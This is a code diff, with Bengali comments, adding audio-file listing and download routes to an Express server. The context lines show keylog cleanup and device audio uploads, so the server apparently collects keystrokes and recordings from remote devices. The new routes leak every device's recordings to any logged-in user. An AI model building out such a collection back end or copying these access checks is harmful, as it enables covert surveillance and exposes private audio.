@@ -371,6 +371,30 @@ app.post("/api/audio/upload", uploadAudio.single("audio"), async (req, res) => {
   }
 });
 
+// নতুন: অডিও ফাইলের তালিকা
+app.get("/api/audio/list", requireLogin, async (req, res) => {
+  const { deviceId } = req.query;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
+  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+    return res.status(403).json({ error: "Not your device." });
+  }
+  const dir = path.join(__dirname, 'uploads', 'audio');
+  fs.readdir(dir, (err, files) => {
+    if (err) return res.status(500).json({ error: "Failed to list audio files" });
+    res.json({ files });
+  });
+});
+
+// নতুন: নির্দিষ্ট অডিও ফাইল ডাউনলোড
+app.get("/api/audio/download/:filename", requireLogin, async (req, res) => {
+  const filename = req.params.filename;
+  const safeFilename = path.basename(filename); // পাথ ট্রাভার্সাল প্রতিরোধ
+  const filePath = path.join(__dirname, 'uploads', 'audio', safeFilename);
+  if (!fs.existsSync(filePath)) return res.status(404).json({ error: "File not found" });
+  res.download(filePath);
+});
+
 // ================= KEYLOG CLEANUP (24 HOURS) =================
 setInterval(() => {
   const cutoff = Date.now() - 24 * 60 * 60 * 1000;
